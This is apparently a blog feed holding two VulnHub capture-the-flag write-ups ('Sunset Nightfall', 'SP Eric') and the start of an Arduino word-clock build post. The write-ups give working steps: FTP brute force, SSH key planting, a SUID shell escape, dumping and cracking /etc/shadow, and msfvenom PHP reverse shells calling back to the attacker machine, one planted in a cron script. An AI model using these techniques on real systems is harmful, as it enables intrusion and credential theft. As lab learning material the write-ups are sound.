[ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;123456789\u0026quot; - 3 of 14344399 [child 2] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;password\u0026quot; - 4 of 14344399 [child 3] (0/0) ... After around 30 seconds a password was found:\n... [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;cheese\u0026quot; - 154 of 14344399 [child 7] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;159753\u0026quot; - 155 of 14344399 [child 10] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;arsenal\u0026quot; - 156 of 14344399 [child 11] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;dolphin\u0026quot; - 157 of 14344399 [child 12] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;antonio\u0026quot; - 158 of 14344399 [child 13] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;heather\u0026quot; - 159 of 14344399 [child 14] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;david\u0026quot; - 160 of 14344399 [child 15] (0/0) [21][ftp] host: 10.0.2.19 login: matt password: cheese [STATUS] attack finished for 10.0.2.19 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-15 10:36:46 I logged into the FTP server as matt, using the password cheese, and started looking around:\nkali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19 Connected to 10.0.2.19. 220 pyftpdlib 1.5.5 ready. Name (10.0.2.19:kali): matt 331 Username ok, send password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 Active data connection established. 125 Data connection already open. Transfer starting. -rw------- 1 matt matt 0 Aug 28 22:41 .bash_history -rw-r--r-- 1 matt matt 220 Aug 26 00:34 .bash_logout -rw-r--r-- 1 matt matt 3526 Aug 26 00:34 .bashrc drwx------ 3 matt matt 4096 Aug 28 21:26 .gnupg drwxr-xr-x 3 matt matt 4096 Aug 26 00:42 .local -rw-r--r-- 1 matt matt 807 Aug 26 00:34 .profile -rw------- 1 matt matt 0 Aug 28 22:41 .sh_history 226 Transfer complete. ftp\u0026gt; The first thing I noticed was the .gnupg directory but unfortunately I didn\u0026rsquo;t find anything exciting in it. Changing directories outside of matt\u0026rsquo;s home directory wasn\u0026rsquo;t permitted. I was stuck in the home directory but I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.\nkali@kali:~/Documents/vulnhub/nightfall$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/vulnhub/nightfall/ssh Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/Documents/vulnhub/nightfall/ssh. Your public key has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.pub. kali@kali:~/Documents/vulnhub/nightfall$ cp ssh.pub authorized_keys I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a .ssh directory in matt\u0026rsquo;s home directory and uploaded the authorized_keys file:\nftp\u0026gt; mkdir .ssh 257 \u0026quot;/.ssh\u0026quot; directory created. ftp\u0026gt; cd .ssh 250 \u0026quot;/.ssh\u0026quot; is the current directory. ftp\u0026gt; put authorized_keys local: authorized_keys remote: authorized_keys 200 Active data connection established. 125 Data connection already open. Transfer starting. 226 Transfer complete. 563 bytes sent in 0.00 secs (204.6927 kB/s) I opened up a new terminal and ssh\u0026rsquo;d in as matt, using the private key as the identity file:\nkali@kali:~/Documents/vulnhub/nightfall$ ssh matt@10.0.2.19 -i ssh Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ... ... matt@nightfall:~$ Once I was logged in as matt I downloaded a copy of LinEnum.sh from my machine (10.0.2.15) and ran it as matt:\nmatt@nightfall:~$ wget http://10.0.2.15:8000/LinEnum.sh ... ... 2020-02-15 10:49:45 (23.4 MB/s) - ‘LinEnum.sh’ saved [46631/46631] Again, like enum4linux, LinEnum outputs a lot of information, but the interesting bit in all of the noise was here:\nmatt@nightfall:~$ ./LinEnum.sh ... ... [+] Possibly interesting SUID files: -rwsr-sr-x 1 nightfall nightfall 315904 Aug 28 14:31 /scripts/find ... ... This copy of find runs as user nightfall due to the SUID permission on the file. find can execute shell commands (using the -exec flag) and GTFOBins documents a nice one-liner to get a shell via find.\nmatt@nightfall:~$ cd /scripts matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \\; -quit $ whoami nightfall $ cd /home/nightfall $ ls user.txt $ cat user.txt 97fb7140ca325ed96f67be3c9e30083d The first flag was found. To get around having to pivot through matt to user nightfall (and to also get a better shell) I decided to set up ssh the same way I did for matt:\n$ mkdir .ssh $ cd .ssh $ cp /home/matt/.ssh/authorized_keys authorized_keys Once the authorized_keys were in place I could ssh in as nightfall.\nkali@kali:~/Documents/vulnhub/nightfall$ ssh nightfall@10.0.2.19 -i ssh Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ... ... nightfall@nightfall:~$ Running LinEnum again (this time as nightfall) flagged something interesting:\nnightfall@nightfall:~$ /home/matt/./LinEnum.sh ... (root) NOPASSWD: /usr/bin/cat ... \u0026ldquo;Wait, does this mean I can run sudo cat as root without a password?\u0026rdquo; I thought. Yes:\nnightfall@nightfall:~$ sudo cat /etc/shadow root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7::: daemon:*:18126:0:99999:7::: bin:*:18126:0:99999:7::: sys:*:18126:0:99999:7::: sync:*:18126:0:99999:7::: games:*:18126:0:99999:7::: man:*:18126:0:99999:7::: lp:*:18126:0:99999:7::: mail:*:18126:0:99999:7::: news:*:18126:0:99999:7::: uucp:*:18126:0:99999:7::: proxy:*:18126:0:99999:7::: www-data:*:18126:0:99999:7::: backup:*:18126:0:99999:7::: list:*:18126:0:99999:7::: irc:*:18126:0:99999:7::: gnats:*:18126:0:99999:7::: nobody:*:18126:0:99999:7::: _apt:*:18126:0:99999:7::: systemd-timesync:*:18126:0:99999:7::: systemd-network:*:18126:0:99999:7::: systemd-resolve:*:18126:0:99999:7::: messagebus:*:18126:0:99999:7::: avahi-autoipd:*:18126:0:99999:7::: avahi:*:18126:0:99999:7::: saned:*:18126:0:99999:7::: colord:*:18126:0:99999:7::: hplip:*:18126:0:99999:7::: nightfall:$6$u9n0NMGDN2h3/Npy$y/PVdaqMcdobHf4ZPvbrHNFMwMkPWwamWuKGxn2wqJygEC09UNJNb10X0HBK15Hs4ZwyFtdwixyyfu2QEC1U4/:18134:0:99999:7::: systemd-coredump:!!:18126:::::: sshd:*:18126:0:99999:7::: mysql:!:18126:0:99999:7::: matt:$6$2u38Z1fOk8zIC5kO$oSfp/Ic0Uhb9225EdHB63ugob.B58mPuJJ8YpMB9hNaZAoJk9n3rhs9DHobzmsB20E5Yxjqsnn1x.QGKeAmiR1:18134:0:99999:7::: I copied the entry in /etc/shadow for the root user into a text file (root_shadow.txt) and used john the ripper to crack the password:\nkali@kali:~/Documents/vulnhub/nightfall$ sudo john root_shadow.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist miguel2 (root) 1g 0:00:00:09 DONE 2/3 (2020-02-15 11:53) 0.1091g/s 3564p/s 3564c/s 3564C/s miguel2..jesucristo2 Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed kali@kali:~/Documents/vulnhub/nightfall$ The final step was to switch to the root user, using the cracked password miguel2:\nnightfall@nightfall:~$ su - Password: root@nightfall:~# ls root_super_secret_flag.txt root@nightfall:~# cat root_super_secret_flag.txt Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- Thank you for playing! - Felipe Winsnes (whitecr0wz) flag{9a5b21fc6719fe33004d66b703d70a39} ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- root@nightfall:~# Final thoughts This was the first time I\u0026rsquo;d come face to face with Samba and SMB. I have a lot to learn about Windows (ugh) and some of the common services found running on Windows (ugh) but I\u0026rsquo;m happy the gaps in my knowledge didn\u0026rsquo;t stop me from completing this box. Nightfall was an interesting challenge that forced me to step away for a few days, do my research, and come back with a plan.\n","permalink":"/posts/vulnhub-sunset-nightfall/","summary":"Here\u0026rsquo;s my write-up for Nightfall, a VulnHub box created by whitecr0wz, which is part of the Sunset series.\nWrite-up The description for this box states the following:\nNightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge. There wasn\u0026rsquo;t much to go off there so I ran a port scan using nmap to see what was running:\nkali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19 Starting Nmap 7.","title":"VulnHub: Sunset Nightfall"},{"content":"This weekend I managed to fully root a VulnHub box without looking at another person\u0026rsquo;s write-up for a hint, for the first time! This box was created by Daniel Solstad and can be downloaded here. Here\u0026rsquo;s my write-up.\nWrite-up The description for this box states:\nEric is trying to reach out on the Internet, but is he following best practice? Flags: - /root/flag.txt - /home/eric/flag.txt Once I had Eric set up and running I ran a port scan:\nkali@kali~/Documents/vulnhub/eric$ nmap -sC -sV -o nmap 10.0.2.17 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 16:13 EST Nmap scan report for 10.0.2.17 Host is up (0.00038s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d3:79:15:3d:11:4c:af:26:6c:b2:af:6a:0b:99:14:fd (RSA) | 256 87:48:76:38:81:c2:a0:50:cd:4c:39:c0:7c:7a:07:40 (ECDSA) |_ 256 8e:b9:dd:8d:14:9b:e3:63:1d:d7:0e:54:98:8d:29:5b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-git: | 10.0.2.17:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: minor changes |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Blog under construction Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 was exposed and Nmap also found a Git repository under 10.0.2.17:80/.git/. Before I interrogated the git repository I took a look at what was running port 80.\nViewing the source confirmed this was just some static placeholder content.\nIt was time to take a look at that Git repo. Heading over to 10.0.2.17/.git gave me a 403 so I did some research and came across of set of useful scripts, one of which \u0026ldquo;can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled\u0026rdquo;. I cloned the repo and ran the script:\nkali@kali:~/Documents/vulnhub/eric$ /opt/GitTools/Dumper/./gitdumper.sh http://10.0.2.17/.git/ git ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [+] Creating git/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [+] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [-] Downloaded: packed-refs [+] Downloaded: refs/heads/master [-] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD [+] Downloaded: logs/refs/heads/master [-] Downloaded: logs/refs/remotes/origin/HEAD [-] Downloaded: info/refs [+] Downloaded: info/exclude [+] Downloaded: objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0 [-] Downloaded: objects/00/00000000000000000000000000000000000000 [+] Downloaded: objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249 [+] Downloaded: objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c [+] Downloaded: objects/31/33d44be3eebe6c6761b50c6fdf5b7fb664c2d8 [+] Downloaded: objects/3d/8e9ce9093fc391845dd69b0436b258ac4a6387 [+] Downloaded: objects/f0/d95f54335626ce6c96522e0a9105780b3366c5 [+] Downloaded: objects/c0/951efcb330fc310911d714acf03b873aa9ab43 [+] Downloaded: objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8 [+] Downloaded: objects/e7/ba67226cda1ecc1bd3a2537f0be94343d448bb Running git status in the dumped repository showed two files: admin.php and index.php.\nkali@kali:~/Documents/vulnhub/eric/git$ git status On branch master Changes not staged for commit: (use \u0026quot;git add/rm \u0026lt;file\u0026gt;...\u0026quot; to update what will be committed) (use \u0026quot;git restore \u0026lt;file\u0026gt;...\u0026quot; to discard changes in working directory) deleted: admin.php deleted: index.php no changes added to commit (use \u0026quot;git add\u0026quot; and/or \u0026quot;git commit -a\u0026quot;) Running git reset --hard put the repo into a clean working state. I looked inside admin.php and found some useful information:\nkali@kali:~/Documents/vulnhub/eric/git$ cat admin.php \u0026lt;?php ob_start(); session_start(); if ($_POST['submit']) { if ($_POST['username'] == 'admin' \u0026amp;\u0026amp; $_POST['password'] == 'st@mpch0rdt.ightiRu$glo0mappL3') { $_SESSION['auth'] = 1; } else { exit(\u0026quot;Wrong username and/or password. Don't even bother bruteforcing.\u0026quot;); } } // Todo: Make sure it is only allowed to upload images. if ($_POST['submit_post']) { if (move_uploaded_file($_FILES['image']['tmp_name'], 'upload/' . $_FILES['image']['name'])) { } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;admin login\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php if (!isset($_SESSION['auth'])) { ?\u0026gt; \u0026lt;form action=\u0026quot;admin.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input name=\u0026quot;username\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;Username\u0026quot; /\u0026gt; \u0026lt;input name=\u0026quot;password\u0026quot; type=\u0026quot;password\u0026quot; placeholder=\u0026quot;Password\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input name=\u0026quot;submit\u0026quot; type=\u0026quot;submit\u0026quot; value=\u0026quot;Login\u0026quot;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } else { ?\u0026gt; \u0026lt;h1\u0026gt;Add new post (under construction)\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026quot;admin.php\u0026quot; method=\u0026quot;post\u0026quot; enctype=\u0026quot;multipart/form-data\u0026quot;\u0026gt; \u0026lt;input name=\u0026quot;post_title\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;Title\u0026quot;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;textarea name=\u0026quot;post_body\u0026quot; cols=\u0026quot;40\u0026quot; rows=\u0026quot;3\u0026quot; placeholder=\u0026quot;Body\u0026quot;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input name=\u0026quot;image\u0026quot; type=\u0026quot;file\u0026quot; placeholder=\u0026quot;Image\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; name=\u0026quot;submit_post\u0026quot; value=\u0026quot;Upload\u0026quot;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;h1\u0026gt;Add site to blogroll\u0026lt;/h1\u0026gt; \u0026lt;input name=\u0026quot;blogroll_add\u0026quot; type=\u0026quot;text\u0026quot;/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input name=\u0026quot;blogroll_submit\u0026quot; type=\u0026quot;submit\u0026quot; value=\u0026quot;add\u0026quot;/\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The two things I noted were:\n Admin credentials hardcoded (admin:st@mpch0rdt.ightiRu$glo0mappL3) Some function to allow admin users to upload files to an upload directory.  Taking a look at admin.php in the browser presented me with a login form:\nI logged in with the hardcoded credentials I found inside admin.php and was redirected to an admin UI:\nMost of the screen was labelled \u0026ldquo;(under construction)\u0026rdquo; but reading the source code of admin.php made me think that the file upload mechanism was at least working. To quickly test this out I uploaded a test file (test.txt) that contained the string abc123. Clicking \u0026ldquo;Upload\u0026rdquo; didn\u0026rsquo;t return any noticeable errors so I had a look at 10.0.2.17/upload/test.txt and found my file\u0026rsquo;s contents.\nBecause Eric was capable of running and executing PHP, it was likely that I could set up a reverse shell by uploading a payload, executing it and listening out for the connection back from Eric.\nThe first step was to generate the payload, configuring the listening host to my machine\u0026rsquo;s IP and listening port to some arbitrary port that wasn\u0026rsquo;t used on my machine, in this case, 4000.\nkali@kali:~/Documents/vulnhub/eric$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=4000 -o shell.php /usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 30685 bytes Saved as: shell.php The next step was to run the multi/handler exploit from msfconsole to listen out for the incoming connection from Eric:\nmsf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set payload php/meterpreter_reverse_tcp payload =\u0026gt; php/meterpreter_reverse_tcp msf5 exploit(multi/handler) \u0026gt; set LPORT 4000 LPORT =\u0026gt; 4000 msf5 exploit(multi/handler) \u0026gt; set LHOST 10.0.2.15 LHOST =\u0026gt; 10.0.2.15 msf5 \u0026gt; run The final step was to upload shell.php and to visit 10.0.2.17/upload/shell.php to execute the script. Once the script had executed I flipped back to msfconsole, saw that I had a connection and started poking around:\nmeterpreter \u0026gt; ls Listing: /var/www/html/upload ============================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 30685 fil 2020-02-08 17:04:35 -0500 shell.php 100644/rw-r--r-- 7 fil 2020-02-08 16:51:39 -0500 test.txt I had a look inside /etc/passwd and found a user named \u0026ldquo;eric\u0026rdquo;, as previously hinted at in the description for the box.\nroot❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin ... eric❌1001:1001:,,,:/home/eric:/bin/bash sshd❌106:65534::/run/sshd:/usr/sbin/nologin Inside /home/eric I found the first flag:\nmeterpreter \u0026gt; cd /home/eric meterpreter \u0026gt; ls -al Listing: /home/eric =================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100600/rw------- 81 fil 2018-12-23 12:02:47 -0500 .bash_history 100644/rw-r--r-- 220 fil 2018-10-28 07:53:24 -0400 .bash_logout 100644/rw-r--r-- 3771 fil 2018-10-28 07:53:24 -0400 .bashrc 40700/rwx------ 4096 dir 2018-10-28 09:00:02 -0400 .cache 40775/rwxrwxr-x 4096 dir 2018-10-28 09:00:11 -0400 .local 100644/rw-r--r-- 807 fil 2018-10-28 07:53:24 -0400 .profile 100644/rw-r--r-- 0 fil 2018-10-28 09:26:18 -0400 .sudo_as_admin_successful 100777/rwxrwxrwx 93 fil 2018-10-28 09:27:43 -0500 backup.sh 100644/rw-r--r-- 31239 fil 2020-02-09 09:57:01 -0500 backup.zip 100644/rw-r--r-- 13 fil 2018-10-28 09:29:18 -0400 flag.txt meterpreter \u0026gt; cat flag.txt 89340a834323 I also found an interesting couple of files: backup.sh and backup.zip. I didn\u0026rsquo;t know what .sudo_as_admin_successful was, but it didn\u0026rsquo;t have any content so I just left it. Looking inside backup.sh I found the following:\nmeterpreter \u0026gt; cat backup.sh #!/bin/bash zip -r /home/eric/backup.zip /var/www/html Given the contents of backup.sh and the last modified date of backup.zip, one could presume that backup.sh is running on a cronjob periodically. At least, that\u0026rsquo;s what I presumed. I tried looking around for the running cronjob configuration but because I was running as user www-data and (again, presumably) the cronjob was set up on either root or eric I didn\u0026rsquo;t have permission to view the config. Either way, something somewhere was executing backup.sh every few minutes. I also noticed that backup.sh had all the perms, which meant I had permission to write to it.\nI decided to set up another reverse shell, this time on port 7000, that would be initiated by backup.sh. I made a copy of the previously uploaded shell (located under /var/www/html/upload/shell.php) and changed the listening to 7000.\nI added the following line to backup.sh so that when it was executed shell_7000.php would be executed and a reverse shell would be initiated:\nphp -f /var/www/html/upload/shell_7000.php I went back to msfconsole and moved my current meterpreter session to the background, changed the listening port to 7000, and ran the listener again:\nmeterpreter \u0026gt; background [*] Backgrounding session 1... msf5 exploit(multi/handler) \u0026gt; set LPORT 7000 LPORT =\u0026gt; 7000 msf5 exploit(multi/handler) \u0026gt; run After a few minutes a connection was initiated:\n[*] Started reverse TCP handler on 10.0.2.15:7000 [*] Meterpreter session 2 opened (10.0.2.15:7000 -\u0026gt; 10.0.2.17:55208)... I dropped into a shell and found that I was running as the root user:\nmeterpreter \u0026gt; shell Process 995 created. Channel 0 created. whoami root cat flag.txt 6a347b975dd18ae6497c Final thoughts I had a lot of fun working through this box, and I\u0026rsquo;m having a lot of fun learning about a whole new area of expertise. A number of times I was left scratching my head trying to figure out the next steps, sometimes stepping away for an hour or so, or coming back to it the next morning. I pressed on and eventually managed to get to a solution.\nAs a programmer I know the value in stepping away from a problem for a bit, going for a walk or grabbing some food, waiting for that \u0026ldquo;eureka\u0026rdquo; moment. It turns out it\u0026rsquo;s just as applicable in this context too!\n","permalink":"/posts/my-first-writeup/","summary":"This weekend I managed to fully root a VulnHub box without looking at another person\u0026rsquo;s write-up for a hint, for the first time! This box was created by Daniel Solstad and can be downloaded here. Here\u0026rsquo;s my write-up.\nWrite-up The description for this box states:\nEric is trying to reach out on the Internet, but is he following best practice? Flags: - /root/flag.txt - /home/eric/flag.txt Once I had Eric set up and running I ran a port scan:","title":"VulnHub: SP Eric"},{"content":"A few years ago I came across a clock design that I hadn\u0026rsquo;t seen before. I thought the design was pretty cool and I wondered how hard it would be to build a webpage that would display similar wording that highlights to display the current time.\nI got to work hacking around, figuring out how to translate time in numbers to time in text. After a couple of hours I had something I was fairly happy with.\nYou can see the live version here and the code here.\nFlash forward 5 years, having recently found an interest in electronics, I thought to myself: \u0026ldquo;I want to build a clock\u0026rdquo;, not only for the learning experience but also because I could do with a clock.\nI spent a couple of weekends designing, building and soldering together different parts and this is what I came up with: The following sections discuss different parts of the clock, how each part was built, what I learnt and what could be improved.\nThe circuit design The first step was to think about how the circuit would work. At this early stage, I knew I needed at least twenty-two LEDs: an LED to light up each word. \u0026ldquo;It is\u0026rdquo; was treated as a single word as there are only four characters and they are always lit. I first broke the words down into different groups:\nGroup A: it is\nGroup B: five, ten, quarter, twenty, twenty-five, half\nGroup C: to, past, o\u0026rsquo;clock\nGroup D: one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve\nYou can take one word from each group and string them together into a sentence: \u0026ldquo;it is five past ten\u0026rdquo; or \u0026ldquo;it is twenty-five to three\u0026rdquo;. The only exception is that you do not pick an option from Group B when \u0026ldquo;o\u0026rsquo;clock\u0026rdquo; is picked from Group C: \u0026ldquo;It is four o\u0026rsquo;clock\u0026rdquo;. I then had to figure out how to individually address twenty-two LEDs with only twenty addressable pins on the Arduino. I researched around and came across a technique called Charlieplexing.\nCharlieplexing exploits the diodic nature of LEDs, that is, LEDs only allow electricity to flow in a single direction.\nThe above image shows two LEDs in parallel, both aligned differently such that their cathodes and anodes are opposite each other.\nIf we connect the two circuit inputs to Arduino pins and set the top input to HIGH and the bottom input to LOW the left LED will light up:\nIf we set the top input to LOW and the bottom input to HIGH the right LED will light up:\nIf we connect more inputs and more LEDs we can create a matrix of individually addressable LEDs:\nIf we set the top input to HIGH, set the middle input to LOW and disconnect the bottom input, the top-left LED turns on:\nIf we disconnect the top input, set the middle input to LOW and set the bottom input to HIGH, the middle-bottom LED turns on:\nBy controlling which output pin on the Arduino is set to HIGH, which output pin is set to LOW and which output pin is marked as an input (essentially disconnecting it from the circuit) you can individually address LEDs in the matrix.\nOne downside to Charlieplexing is that you can only have 1 LED on at a time. Setting two inputs to HIGH and one input to LOW produces weird outcomes. This \u0026ldquo;1 LED at a time\u0026rdquo; thing wasn\u0026rsquo;t going to be an issue though, because I could create 2 individual Charlieplexed circuits: a circuit for Group D and circuit for Group B. Group A is always lit so I\u0026rsquo;ll connect that directly to 5v and ground. Group C only has 3 words in it so I\u0026rsquo;ll connect each of those to a pin on the Arduino and ground.\nAs a reminder, these are the word groups:\nGroup A (connected to 5v): it is\nGroup B (Charlieplexed): five, ten, quarter, twenty, twenty-five, half\nGroup C (each connected to a pin on the Arduino): to, past, o\u0026rsquo;clock\nGroup D (Charlieplexed): one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve\nI got started writing code and mounting various components into my breadboard:\nGiven an hour between 0 and 23 and a minute between 0 and 59, the Arduino would work out which LEDs to light up in each Charlieplex and change the outputs respectively. One thing I hadn\u0026rsquo;t put much thought into yet was how to keep track of time, but I\u0026rsquo;ll cover that point later on.\nIf you want to learn more about Charlieplexing this article is great.\nThe face I had a prototype circuit working so I got started on the face of the clock. I picked up some tracing paper and some black paper, cut a couple of test letters into the black paper and held the tracing paper behind the cut letters so that the light was diffused through the gaps:\nThis seemed to work pretty well so I went with it. I knew that I wanted the clock to be about the size of my small cutting board. I drew around the cutting board to help me estimate how much space I would have to fit the letters in and got to work stencilling.\nAfter the letters were down on paper I took a sharp blade and cut out the letters.\nThe frame Once I had the face sorted I had to work out how to mount it. I cut off four pieces of sturdy card and glued them together, using triangle pieces to help with stability. I added a slight angle to the bottom of the frame so that the clock sort of leans back a bit when it\u0026rsquo;s stood up.\nI was pretty happy with the outcome and decided that there would be enough space for all of the electronics to fit within the frame. I carefully mounted the clock face onto the frame, using some black insulation tape to neaten up the edges:\nNow I had to figure out how exactly I was going to mount the LEDs behind each word, keeping in mind that I didn\u0026rsquo;t want the light to bleed across words.\nI built a small \u0026ldquo;prototype LED box thing\u0026rdquo; that housed an LED, covered it with some tracing paper and held that behind a word on the clock face:\nAfter some experimentation, I realised that 1 LED behind each word wasn\u0026rsquo;t going to cut it, especially for the longest word \u0026ldquo;twenty-five\u0026rdquo;. The light from the LED was not spreading out enough within the box. To try and fix this I decided to add more LEDs. I scribbled down which words would need an extra LED and worked out that I could probably fit all these extra LEDs into a separate Charlieplex.\nRegrettably, I rushed through this decision too quickly and missed a couple of things, but we\u0026rsquo;ll explore those in more detail later on. I knew I roughly had enough pins to achieve what I wanted and the worst case was that I only end up with 1 LED behind each word, which works fine, it just doesn\u0026rsquo;t look as good.\nI had an idea in mind for the internal LED frame so I got started on that. I cut out some rectangular pieces of card and used them to start building up the internal frame, positioning them based on how the words sat on the clock face:\nOnce the internal LED frame was built I mounted it onto a sheet of card and worked out where the LEDs should sit, making holes for them with a screwdriver, and glueing the LEDs in place:\nTracking time One thing that I hadn\u0026rsquo;t solved yet was how to keep track of time. Whilst building the frame and the clock face in the back of my mind, I had this scattered idea that I could maybe count the number of seconds since the Arduino was plugged in or something\u0026hellip; and then to change the hour and minutes I would have two switches\u0026hellip; having it always start at midnight\u0026hellip; but the more I thought about it and researched it as an option the less suitable it felt. I remembered that my Arduino starter kit came with a clock module, labelled \u0026ldquo;DS1307\u0026rdquo;, which looks a bit like this:\nThese are handly little modules that fairly accurately keep track of time using a crystal oscillator. If the module loses power it falls back onto the lithium cell battery and keeps on counting the seconds. This meant that I could unplug the clock and still have the time running in the background.\nI researched how to wire this module up to the Arduino and what library I needed to communicate with it. It didn\u0026rsquo;t work. For some reason, I kept getting \u0026ldquo;15:34:00, May 9th 2918\u0026rdquo; or something out of the module. I tried to set the time on the module but that didn\u0026rsquo;t work either.\nI searched around on different forums and after trying lots of different code examples it still didn\u0026rsquo;t work. I assumed that my module was broke in some way. I checked the battery but that had power so it wasn\u0026rsquo;t that. I left the module for a bit and researched how easy it was to build a clock circuit myself. It turns out that it wouldn\u0026rsquo;t take too much effort but I didn\u0026rsquo;t have many of the parts so I decided to go back to the module and try one more time. I came across some example code online that used a different library written for a DS3231 module. I thought \u0026ldquo;what the heck\u0026rdquo; and ran it. It worked, which was weird but I didn\u0026rsquo;t question it. I had a working clock. I set the time on the module, made changes to the code where I needed and that was that. I think they might have used the wrong chip on the module or something, I\u0026rsquo;m not too sure but I had a working clock so I didn\u0026rsquo;t give it much more thought.\nThe wiring and final assembly It was time to wire everything up, starting with the LEDs. Each leg of the 32 LEDs needed a wire soldering to them. I also decided to wire up the first Charlieplex, which was Group D 